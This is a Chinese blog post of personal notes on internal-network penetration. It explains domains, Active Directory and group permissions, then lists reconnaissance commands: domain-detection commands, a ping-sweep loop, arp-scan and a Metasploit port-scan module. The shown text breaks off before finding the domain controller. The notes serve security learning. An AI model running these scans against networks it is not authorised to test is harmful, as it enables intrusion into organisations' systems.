

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="CNAQ">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00  前言此笔记仅为作者学习及工作记录。什么是内网渗透：– 内网是一个只有组织工作人员才能访问的专用网络，简而言之就是不可简单地通过外部公网ip进行访问到的公司内部网络。对于一个大型公司的网络系统，通过信息收集找到网站漏洞可以顺利通过公网进入公司内部网络时，进一步对公司内部网络的渗透攻击即为内网渗透。 与外网渗透区别：1、外网渗透更侧重于找漏洞寻找突破口，考验的是白帽的综合能力，外网渗透的最">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透总结">
<meta property="og:url" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="一只鲶鱼">
<meta property="og:description" content="0x00  前言此笔记仅为作者学习及工作记录。什么是内网渗透：– 内网是一个只有组织工作人员才能访问的专用网络，简而言之就是不可简单地通过外部公网ip进行访问到的公司内部网络。对于一个大型公司的网络系统，通过信息收集找到网站漏洞可以顺利通过公网进入公司内部网络时，进一步对公司内部网络的渗透攻击即为内网渗透。 与外网渗透区别：1、外网渗透更侧重于找漏洞寻找突破口，考验的是白帽的综合能力，外网渗透的最">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/002.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/003.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/004.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/005.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/006.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/007.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/008.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/009.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/010.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/011.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/012.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/013.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/014.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/015.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/016.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/017.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/018.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/019.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/020.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/021.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/022.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/023.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/024.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/025.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/026.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/027.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/028.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/029.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/030.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/031.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/032.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/033.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/034.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/035.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/036.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/037.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/038.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/039.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/040.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/041.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/042.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/043.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/044.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/045.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/046.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/047.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/048.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/049.png">
<meta property="og:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/050.png">
<meta property="article:published_time" content="2024-07-26T04:00:11.000Z">
<meta property="article:modified_time" content="2025-03-05T06:38:25.390Z">
<meta property="article:author" content="CNAQ">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://aqiao-jashell.github.io/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png">
  
  
  
  <title>内网渗透总结 - 一只鲶鱼</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"aqiao-jashell.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"uOGt77jvpFaYohTodQumjdZC-gzGzoHsz","app_key":"31Yh2ERJg2UAciRs4CWKtJTr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>一只鲶鱼</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="内网渗透总结"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-07-26 12:00" pubdate>
          2024年7月26日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.3k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          62 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">内网渗透总结</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a><strong>0x00  前言</strong></h2><h2 id="此笔记仅为作者学习及工作记录。"><a href="#此笔记仅为作者学习及工作记录。" class="headerlink" title="此笔记仅为作者学习及工作记录。"></a>此笔记仅为作者学习及工作记录。</h2><h6 id="什么是内网渗透："><a href="#什么是内网渗透：" class="headerlink" title="什么是内网渗透："></a><strong>什么是内网渗透：</strong></h6><p>– 内网是一个只有组织工作人员才能访问的专用网络，简而言之就是不可简单地通过外部公网ip进行访问到的公司内部网络。对于一个大型公司的网络系统，通过信息收集找到网站漏洞可以顺利通过公网进入公司内部网络时，进一步对公司内部网络的渗透攻击即为内网渗透。</p>
<h3 id="与外网渗透区别："><a href="#与外网渗透区别：" class="headerlink" title="与外网渗透区别："></a>与外网渗透区别：</h3><p>1、外网渗透更侧重于找漏洞寻找突破口，考验的是白帽的综合能力，外网渗透的最终还是为了进入内网。</p>
<p>2、内网渗透更侧重于对目标的熟悉程度，对环境是否足够熟悉？对目标的情况是否了然于胸？哪里有敏感信息等等。</p>
<h3 id="内网渗透分类："><a href="#内网渗透分类：" class="headerlink" title="内网渗透分类："></a>内网渗透分类：</h3><p>内网渗透分为域渗透和工作组渗透两类，亦分为域环境渗透和非域环境渗透。</p>
<h2 id="0x01-内网渗透基础知识"><a href="#0x01-内网渗透基础知识" class="headerlink" title="0x01  内网渗透基础知识"></a><strong>0x01  内网渗透基础知识</strong></h2><p>在内网中会出现许多名词和概念，如工作组、域、活动目录、域控、安全域、域权限等等。</p>
<h6 id="（一）工作组"><a href="#（一）工作组" class="headerlink" title="（一）工作组"></a>（一）工作组</h6><p>工作组简单理解就是根据工作特性不同而划分的计算机组。在一个局域网中，不同的计算机可以按照功能或部门的不同列入不同的工作组，例如销售部的计算机列入“销售部”工作组。财务部的计算机列入”财务部“工作组，技术部的计算机列入”技术部“工作组，这样下来当想要访问某个部门的资源时，只要在”网络“中单击部门的工作组名就可以找到看到其下的所有的计算机，从而提升了网络中的管理层次。</p>
<p>个人笔记本正常下就是处于工作组里的。工作组里的电脑都是平等的，是最常见最普通的资源管理模式，在网络中工作组是可以自由进入和退出的，同时工作组没有集中管理功能。</p>
<h6 id="（二）域"><a href="#（二）域" class="headerlink" title="（二）域"></a><strong>（二）域</strong></h6><p>域是一个有安全边界的计算机集合，域通过安全边界来隔离本域和外部资源。用户如果想要访问域内资源则需要以合法的权限登录域。而登陆域则需要经过“域内保安”-域控制器（Domain Controller,DC）的审核，域控制器负责对连入的计算机和用户的验证工作，它本身存有整个域中关键信息（包括账号、密码、计算机名等）的数据库，其中身份验证主要经过以下几个步骤：</p>
<p><code>        </code>1、该计算机是否属于本域</p>
<p><code>        </code>2、登录账号是否存在</p>
<p><code>        </code>3、密码是否正确</p>
<p>在通过域控的身份认证后才能访问本域资源，进入域后则需要知道自己处于哪个域环境中：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">1、单域：一般情况下至少存在两台域服务器，分别为DC和备份DC。活动目录的数据库是存储于DC中的，备份DC的作用是当主域瘫痪时可以替代主域控直至恢复瘫痪的DC<br>2、父域和子域：出于管理等需求在网络中划分多个域，而第一个域被称为父域，各分部的域被称为子域。例如父域为<span class="hljs-keyword">mac</span>.com，那么子域就为*.<span class="hljs-keyword">mac</span>.com<br>3、域树：域树是多个域通过建立信任关系组成的集合。建立信任关系的两个域可以互相访问。而域树内的父域和子域不仅可以按需相互管理，还可以跨网络分配文件等资源，在一个域树中，父域可以拥有多个子域，子域也只能以父域的名字作为后缀名<br>4、域森林：域森林是指多个域树建立信任关系组成的集合，例如某公司有域树<span class="hljs-keyword">mac</span>.com，原来就有自己的域树<span class="hljs-keyword">mac</span>.top，而<span class="hljs-keyword">mac</span>.com无法挂在<span class="hljs-keyword">mac</span>.top域树下，所以需要通过建立信任关系来构成域森林。通过域树之间的信任关系，可以管理和使用整个域森林中的资源。<br>5、域名服务器：一般来说域控制器就是DNS服务器，用于实现域名和IP地址的转换。<br></code></pre></td></tr></table></figure>


<h6 id="（三）活动目录"><a href="#（三）活动目录" class="headerlink" title="（三）活动目录"></a><strong>（三）活动目录</strong></h6><p>活动目录（Active Directory,AD）是指域环境中提供目录服务的组件，目录是用于存储有关网络对象的信息，目录服务是指帮助用户快速、准备地从目录中找到其所需要的信息，而活动目录实现了目录服务，为企业提供了网络环境好中的集中式管理机制。</p>
<p>在活动目录中存在逻辑架构，包括组织单元（OU）、域、域树、域森林。同一域树的所有域共享一个活动目录，其中的数据分散存储在各个域中，且每个域只存储该域的数据。比如我有一个名为M的集团，下面存在A、B、C三个子公司，子公司下包含各个部门，那么就可以以M集团（域森林）&gt;子公司（域树）&gt;部门（域）&gt;员工（域用户）为结构。活动目录的这种层次结构使企业网络具有极强的可扩展性，便于住址、管理以及目录定位。</p>
<p>活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制，活动目录的主要功能：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 账号集中管理：所有账号都存储在服务器中<br><span class="hljs-bullet">2.</span> 软件集中管理：统一推送软件、安装软件<br><span class="hljs-bullet">3.</span> 环境集中管理：统一客户端桌面、IE设置<br><span class="hljs-bullet">4.</span> 增强安全性：统一部署杀毒软件和病毒扫描任务、统一制定用户密码策略。<br></code></pre></td></tr></table></figure>

<p><strong>（四）域权限</strong> </p>
<p>在域内由于账号太多，管理员在为其分配权限时会浪费许多时间，便有了安全组的概念，它将处于同一权限的账户放置在同一组中，而管理员只需要设置组的访问权限就可以管理组内的一大批账户，可以大大简化网络维护和管理工作。接下来就简单介绍下域本地组、全局组、通用组的概念和区别。      </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">1、域本地组<br>多域用户访问单域资源（访问同一域），不能嵌套在其他组中，只能在其所在域内指派权限。<br>2、全局组<br>单域用户访问多域资源（必须是一个域里面的用户），能嵌套在其他组中，可在林中的任何域指派权限。<br>3、通用组<br>	多域用户访问多域资源，能嵌套在其他组中，可在该域树或该林中的任何域中指派权限。<br></code></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>-G-<span class="hljs-selector-tag">DL</span>-<span class="hljs-selector-tag">P</span>策略：<br><span class="hljs-selector-tag">A</span>：Account，用户账号<br><br>G：Global Group，全局组<br><br>U：Universal Group，通用组<br><br><span class="hljs-selector-tag">DL</span>：Domain Local Group，域本地组<br><br><span class="hljs-selector-tag">P</span>：Permission，许可<br><br></code></pre></td></tr></table></figure>


<p>A-G-DL-P策略是将用户策略添加到全局组中，将全局组添加到域本地组中，然后会域本地组分配资源权限。通过该策略对用户进行组织和管理是非常容易的，当需要给某一个用户添加到某个权限时，只要把这个用户添加到某个域本地组就可以了。比如存在两个域，分别为A域和B域，A域内有个A用户，B域内有个B用户，这两个用户都需要访问B域内的某个文件夹C，可以先在A、B两个域内各建一个全局组，然后在B域中建立一个域本地组，将这两个全局组都加入到这个域本地组中，再将C文件夹的访问权限赋予给这个域本地组。那么这个两个用户也就都能访问到B域内的C文件夹了，且A域管理员可以管理A用户，B域管理员可以管理B用户。如果不使用该策略，当A域的访问用户发生变化时，A域管理员会通知B域管理员，而由B域管理员更改域本地组的成员。既浪费了时间又增加了管理难度。</p>
<h6 id="（五）域控制器DC"><a href="#（五）域控制器DC" class="headerlink" title="（五）域控制器DC"></a><strong>（五）域控制器DC</strong></h6><p>是域中的一台类似管理服务器的计算机，负责所有接入的计算机和用户的验证工作，也就是说域内所有用户的密码Hash都保存在域控制器中。</p>
<h2 id="0x02-内网渗透基本流程"><a href="#0x02-内网渗透基本流程" class="headerlink" title="0x02  内网渗透基本流程"></a><strong>0x02  内网渗透基本流程</strong></h2><ol>
<li><h6 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h6><p><strong>判断是否有域的几种方法:</strong></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span>：<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/001.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">System</span>info：<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/002.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<pre><code class="hljs"> 如果显示workgroup则不在域里面：
</code></pre>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/003.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain  （这个有三种情况）：<br></code></pre></td></tr></table></figure>

<p>​		1、存在域并且当前用户是域用户  ：</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/004.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>​		2、存在域，当前用户不是域用户:</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/005.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>​		3、不存在域:</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/006.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config workstation   查看当前登录域:<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/007.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p> <strong>利用 netbios 探测主机存活:</strong><br>工具：nbtscan<br><strong>利用 icmp 协议探测内网:</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> 命令：for /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">110</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/008.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一"></li>
</ol>
<p><strong>利用 arp 扫描探测内网:</strong><br>   工具：arp-scan</p>
<p>​	arp.exe -t IP</p>
   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/009.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
<p> <strong>域内端口扫描:</strong><br>   telnet 命令扫描</p>
<p>   metasploit 端口扫描模块：auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</p>
<p>   端口利用速查：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iAmSoScArEd/p/10564262.html">https://www.cnblogs.com/iAmSoScArEd/p/10564262.html</a></p>
<p> <strong>查找域控制器：</strong></p>
